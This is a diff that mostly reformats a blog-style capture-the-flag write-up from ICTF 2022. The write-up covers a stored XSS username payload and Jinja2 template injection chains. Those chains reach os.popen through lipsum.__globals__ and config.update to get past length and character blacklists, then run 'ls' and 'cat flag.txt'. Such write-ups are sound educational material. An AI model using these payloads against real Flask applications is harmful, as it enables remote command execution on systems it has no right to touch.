@@ -487,7 +487,7 @@ usernames. But first I thought I'd try just asking nicely for votes.
 &nbsp;
 
 First I registered 2 accounts, one named Greg and another named
-`<script>alert('Vote for Greg! :)')`. After voting for the second, other users
+`<script>alert('Vote for Greg! :)')</script>`. After voting for the second, other users
 should receive the alert in Figure 6.1. Hopefully, that gets people to vote for
 me!
 
@@ -573,9 +573,7 @@ shorten the payload.
 I quickly found a [link to a great resource for short SSTI payloads](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/).
 First, I learned about a small way to get access to the os.popen function.
 
-```
-\{\{lipsum.__globals__.os.popen('ls').read()\}\}
-```
+>\{\{lipsum.__globals__.os.popen('ls').read()\}\}
 
 This is the shortest payload I had seen at that moment. It is just short enough to
 avoid the filter.
@@ -589,15 +587,11 @@ long. Luckily, I learned another thing from the blog about short payloads. Turns
 we can use request arguments or set custom application configuration items to
 substitute in long strings.
 
-```
-\{\{config.update(y=request.args.a)\}\}&y=cat%20truly_an_arbitrarily_named_file
-```
+>\{\{config.update(y=request.args.a)\}\}&y=cat%20truly_an_arbitrarily_named_file
 
 Now, I just needed to substitute this into the old payload and see the result.
 
-```
-\{\{lipsum.__globals__.os.popen(config.y).read()\}\}
-```
+>\{\{lipsum.__globals__.os.popen(config.y).read()\}\}
 
 [![Flag get!](/assets/ICTF-2022/sstig2.png)](/assets/ICTF-2022/sstig2.png)
 <figcaption align=center><b>Figure 7.2: Using SSTI to Print Out the Flag</b></figcaption>
@@ -645,42 +639,35 @@ app.run('0.0.0.0', 1337)
 
 The blacklist is pretty strict given what payloads I have done in the past.
 The biggest new restriction for me was no double curly braces allowed. Luckily,
-it's a quick solve. In flask templates curly braces are just an alias for `\{\% print() \%\}`.
+it's a quick solve. In flask templates curly braces are just an alias for **\{&#37; print() &#37;\}**.
 So, we can do everything we normally do, only, it costs us a few extra characters.
 For example,
 
-```
-\{&#37;(config.items()){}&#37;\}
-```
+>\{&#37;(config.items()){}&#37;\}
 
 Now, we just need to somehow make a payload to read the flag with less than 69
 characters. I did a lot of thinking for this part, but eventually, learned a fun
 trick. Back in SSTI Golf, we made a custom entry in the app configuration. We set
-a key y to have a value of `cat%20truly_an_arbitrarily_named_file`. The trick comes
+a key y to have a value of **cat%20truly_an_arbitrarily_named_file**. The trick comes
 in when we supply an object instead of just a string.
 
-```
-\{\%print(config.update(y=SOME_OBJECT))\%\}
-```
+>\{&#37;print(config.update(y=SOME_OBJECT))&#37;\}
+
 
 Using this idea we can put any object we want into the config and refer to its
 children or attributes pretty easily. So, I went forward with trying to get the
 payload from SSTI Golf injected into this challenge.
 
-```
-\{\%print(config.update(a=request.args.a))\%\}&a=__globals__
-```
+>\{&#37;print(config.update(a=request.args.a))&#37;\}&a=__globals__
 
 First, I needed to get access to globals. However, with the blacklist restrictions
 underscores are blocked. So, to get access to it I added the string to the config.
 
-```
-\{\%print(config.update(b=lipsum|attr(config.a)))\%\}
-```
+>\{&#37;print(config.update(b=lipsum|attr(config.a)))&#37;\}
 
-Next, I added the `lipsum.__globals__` object to the config so I could easily
+Next, I added the **lipsum.__globals__** object to the config so I could easily
 access the os module. So, at this point we can access popen with a payload
-containing `config.b.os.popen()`.
+containing **config.b.os.popen()**.
 
 ```python
 txt = html.escape(request.args["txt"])
@@ -692,10 +679,9 @@ popen. It essentially means we cannot use single quotes or double quotes in
 commands without causing an error. So, we also have to add our commands to the
 config to avoid this.
 
-```
-\{\%print(config.update(c=request.args.c))\%\}&c=ls
-\{\%print(config.b.os.popen(config.c).read())\%\}
-```
+>\{&#37;print(config.update(c=request.args.c))&#37;\}&c=ls
+>
+>\{&#37;print(config.b.os.popen(config.c).read())&#37;\}
 
 [![Directory listing](/assets/ICTF-2022/mini1.png)](/assets/ICTF-2022/mini1.png)
 <figcaption align=center><b>Figure 8.1: Using Our Small Payload to Print File Listings</b></figcaption>
@@ -705,10 +691,9 @@ The output of our new Frankenstein command gives us the directory file list.
 This time the flag has a very simple name. The final step is to add a cat command
 to the config and send our final payload.
 
-```
-\{\%print(config.update(d=request.args.d))\%\}&d=cat%20flag.txt
-\{\%print(config.b.os.popen(config.d).read())\%\}
-```
+>\{&#37;print(config.update(d=request.args.d))&#37;\}&d=cat%20flag.txt
+>
+>\{&#37;print(config.b.os.popen(config.d).read())&#37;\}
 
 [![The minigolf flag printed](/assets/ICTF-2022/mini2.png)](/assets/ICTF-2022/mini2.png)
 <figcaption align=center><b>Figure 8.2: Printing Out the Flag for Minigolf</b></figcaption>
